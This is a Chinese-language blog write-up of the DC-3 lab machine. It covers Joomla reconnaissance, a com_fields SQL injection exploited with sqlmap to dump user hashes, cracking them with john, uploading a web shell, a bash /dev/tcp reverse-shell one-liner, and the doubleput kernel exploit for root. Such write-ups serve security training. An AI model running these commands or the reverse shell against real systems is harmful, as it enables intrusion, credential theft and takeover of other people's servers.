
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8" />
    <title>dc-3 | jujub3</title>
    <meta name="author" content="jujub3" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta
        name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
    />
    <link rel="icon" href="/images/head.jpg" />
    <link rel="preconnect" href="https://s4.zstatic.net" />
<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
<link rel="preconnect" href="https://fonts.googleapis.cn" />
<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
<link
    rel="stylesheet"
    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
/>
<script> const mixins = {}; </script>

<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>


<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
<link
    rel="stylesheet"
    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
/>
<script src="/js/lib/highlight.js"></script>



<script src="/js/lib/preview.js"></script>









<link rel="stylesheet" href="/css/main.css" />

<meta name="generator" content="Hexo 7.3.0"></head>
<body>
    <div id="layout">
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>加载过慢请开启缓存 浏览器默认开启</p>
                    <img src="/images/loading.gif" />
                </div>
            </div>
        </transition>
        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
    <nav id="desktop-menu">
        <a class="title" href="/">
            <span>JUJUB3</span>
        </a>
        
        <a href="/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/tags/THM">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
    </nav>
    <nav id="mobile-menu">
        <div class="title" @click="showMenuItems = !showMenuItems">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;JUJUB3</span>
        </div>
        <transition name="slide">
            <div class="items" v-show="showMenuItems">
                
                <a href="/">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-house fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                    </div>
                </a>
                
                <a href="/about">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-id-card fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                    </div>
                </a>
                
                <a href="/archives">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-box-archive fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                    </div>
                </a>
                
                <a href="/categories">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-bookmark fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                    </div>
                </a>
                
                <a href="/tags/THM">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-tags fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                    </div>
                </a>
                
            </div>
        </transition>
    </nav>
</div>
<transition name="fade">
    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
</transition>

        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
            <div class="article">
    <div>
        <h1>dc-3</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2025/4/4
        </span>
        
        
        <span class="tags">
            <span class="icon">
                <i class="fa-solid fa-tags fa-fw"></i>
            </span>
            
            
            <span class="tag">
                
                <a href="/tags/DC/" style="color: #ffa2c4">
                    DC
                </a>
            </span>
            
        </span>
        
    </div>
    
    <div class="content" v-pre>
        <p>信息搜集</p>
<span id="more"></span>

<p><img src="/../dc-3/1733123089958-5a6f29cc-5711-401b-a2cb-c9a0e7f18277.png" alt="img"></p>
<p>得到mac地址：00:0C:29:5A:61:54</p>
<p>然后通过arp-scan -l 扫描与kali同一网段上的ip</p>
<p><img src="/../dc-3/1733123135427-f163ef04-6965-40b3-b4b8-32d21042476e.png" alt="img"></p>
<p>得到ip地址：192.168.126.141</p>
<p>接着扫描这个ip所开放的端口</p>
<p>命令：nmap -A 192.168.126.141 -p 1-65535 -oN nmap.A</p>
<p><img src="/../dc-3/1733123808719-ecb73396-f3e0-482d-b9b6-070c2eb67e60.png" alt="img"></p>
<p>这里可以看到有开放的80端口</p>
<p>whatweb -v ip</p>
<p><img src="/../dc-3/1733124958579-1ead4a4b-37af-474f-be29-f1cf6f12378f.png" alt="img"></p>
<p>发现这个架构是一个Joomla</p>
<p><img src="/../dc-3/1733124332376-4ddacada-a869-4101-b3f1-2af07f503c15.png" alt="img"></p>
<p>最后得到一个信息，这次只有一个flag，然后最后要获得根目录权限</p>
<p>由上面得到这个网站的架构为Joomla，这里需要用到一个这个框架的扫描工具，joomscan，kali上需要自行安装</p>
<p>命令：</p>
<p>apt-get install joomscan -y</p>
<p>安装成功后使用命令：joomscan –url  <a target="_blank" rel="noopener" href="http://192.168.126.141/">http://192.168.126.141/</a>  进行扫描</p>
<p><img src="/../dc-3/1733125363380-e372c7b3-dd0c-4e62-9cff-aa430f2a19f6.png" alt="img"></p>
<p>或者也可以使用其他漏洞工具进行扫描</p>
<p>dirb <a target="_blank" rel="noopener" href="http://192.168.126.141/">http://192.168.126.141/</a></p>
<p>dirsearch -u  <a target="_blank" rel="noopener" href="http://192.168.126.141/">http://192.168.126.141/</a></p>
<p>最后根据cms版本在网上找出来了一个sql注入漏洞，	</p>
<p>直接上sqlmap，爆破当前数库：</p>
<p>sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.126.141/index.php?option=com_fields&view=fields&layout=modal&list%5Bfullordering%5D=">http://192.168.126.141/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=</a>“ –current-db</p>
<p><img src="/../dc-3/1733130284362-aadc5f0e-7eb7-42db-b852-cc72972eed25.png" alt="img"></p>
<p>得到数据库：joomladb</p>
<p>然后爆破表名：</p>
<p>sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.126.141/index.php?option=com_fields&view=fields&layout=modal&list%5Bfullordering%5D=">http://192.168.126.141/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=</a>“ -D joomladb -tables</p>
<p><img src="/../dc-3/1733130690762-ea5978e1-b7d5-449f-af8f-1fd2ceab9213.png" alt="img"></p>
<p>找到了一个   #__users</p>
<p>接着爆破列名，记得在这个表名加上双引号，防止#将后面的内容给注释掉</p>
<p>sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.126.141/index.php?option=com_fields&view=fields&layout=modal&list%5Bfullordering%5D=">http://192.168.126.141/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=</a>“ -D “joomladb” -T “#__users” –columns</p>
<p><img src="/../dc-3/1733131768937-cf91299b-2ee5-4f7a-8157-d6b721a8f497.png" alt="img"></p>
<p>然后直接dump  username 和password</p>
<p>sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.126.141/index.php?option=com_fields&view=fields&layout=modal&list%5Bfullordering%5D=">http://192.168.126.141/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=</a>“ -D “joomladb” -T “#__users” -C “username,password” –dump</p>
<p><img src="/../dc-3/1733131840123-28f8f88f-efb9-43d7-8a4f-c44aeaae6db5.png" alt="img"></p>
<p>最后得到了一个账号跟密码，不过密码是经过加密的，需要用kali中自带的john来破解，</p>
<p>现在桌面上创建一个1.txt，然后将哈希值放进去，最后执行命令：</p>
<p>john  1.txt</p>
<p><img src="/../dc-3/1733133099562-c99bb81c-54f7-4910-9ccc-afa24f2503ad.png" alt="img"></p>
<p>最后得到密码为：snoopy</p>
<p>然后在administrator这个目录下登录进后台	</p>
<p><img src="/../dc-3/1733133263418-97c84f6b-7f1e-4606-a656-a898f72c1a66.png" alt="img"></p>
<p>然后在extensions部分可以上传文件</p>
<p><img src="/../dc-3/1733292084534-373c7741-2f53-4b9e-8db6-417839d20cf0.png" alt="img"></p>
<p>上传木马，最后成功连上<img src="/../dc-3/1733292105744-1ac33db7-0445-4d20-9790-ff96d69cbf1c.png" alt="img"></p>
<p><a target="_blank" rel="noopener" href="http://192.168.3.252/templates/beez3/html/a.php">http://192.168.3.252/templates/beez3/html/a.php</a></p>
<p>查看当前用户：whoami</p>
<p><img src="/../dc-3/1733293182864-f835b46e-8907-449f-aa19-22f007495bcb.png" alt="img"></p>
<p>www-data是一个低权用户。所以还需要提权</p>
<p>查看系统内核：uname -a</p>
<p><img src="/../dc-3/1733293328651-fdaa46b0-32cf-49ae-b52b-098e0f2c98f5.png" alt="img"></p>
<p>查看ubuntu发行版本：lsb-release -a</p>
<p><img src="/../dc-3/1733293690081-806f0a81-206c-4ab9-9555-c4f0c84b8ddc.png" alt="img"></p>
<p>为ubuntu16.04</p>
<p>查找漏洞：</p>
<p>searchsploit ubuntu 16.04 linux</p>
<p><img src="/../dc-3/1733294076000-fb63c970-23d8-46d8-af8e-50508ccacada.png" alt="img"></p>
<p>选择linux&#x2F;local&#x2F;39772.txt这个。</p>
<p>cat &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;39772.txt</p>
<p>最后会得到一个下载方式：	</p>
<p><img src="/../dc-3/1733295262561-d52a6027-e428-4b2c-ac1d-9cbb33da2e6a.png" alt="img"></p>
<p>最后下载下来，将他放到html目录（templates）</p>
<p><img src="/../dc-3/1733295378232-a126b7b4-e9c2-4a23-8ba9-5dc881c9da0b.png" alt="img"></p>
<p>然后反弹shell，在kali上执行：nc -lvp 1234</p>
<p>蚁剑上执行：bash -c ‘bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.3.250&#x2F;1234 0&gt;&amp;1’ </p>
<p>拿到shell：</p>
<p><img src="/../dc-3/1733295449730-1dc4d555-c01f-48a9-933e-e9400e7cf0d4.png" alt="img"></p>
<p>将exploit.tar进行解压：tar -xvf exploit.tar</p>
<p><img src="/../dc-3/1733295915004-0b637bd9-cff5-4e49-bbe2-6724499a9f04.png" alt="img"></p>
<p>cd ebpf_mapfd_doubleput_exploit&#x2F;</p>
<p><img src="/../dc-3/1733295981623-1ab74bc9-96ba-4320-9b7f-3e04f8a98470.png" alt="img"></p>
<p>执行：.&#x2F;compile.sh</p>
<p><img src="/../dc-3/1733296038645-c094b996-3b6a-4208-947b-85061a34df61.png" alt="img"></p>
<p>执行完之后会多一个doubleput</p>
<p><img src="/../dc-3/1733296110452-a64c43ad-7243-47b8-99e4-fb85b4d80bca.png" alt="img">‘</p>
<p>接着继续执行doubleput：.&#x2F;doubleput</p>
<p>最后拥有root权限。就可以直接进入&#x2F;root，拿到最后的flag</p>
<p><img src="/../dc-3/1733296264562-0a9229c1-20fc-4ce7-bf5c-711f3c3d9e97.png" alt="img"></p>

    </div>
    
    
    
    
    <div id="comment">
        <div id="giscus-container" class="giscus"></div>
    </div>
    
    
    
    
</div>

            <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2025 jujub3
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;jujub3
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

        </div>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/js/main.js"></script>
    
    
<script
    src="https://giscus.app/client.js"
    data-repo="jujub3/jujub3.github.io"
    data-repo-id="R_kgDOOQ-ONw"
    data-category="Announcements"
    data-category-id="DIC_kwDOOQ-ON84ComAd"
    data-mapping="pathname"
    data-strict="0"
    data-reactions-enabled="1"
    data-emit-metadata="0"
    data-input-position="bottom"
    data-theme="preferred_color_scheme"
    data-lang="zh-CN"
    crossorigin
    async
></script>





    
</body>
</html>
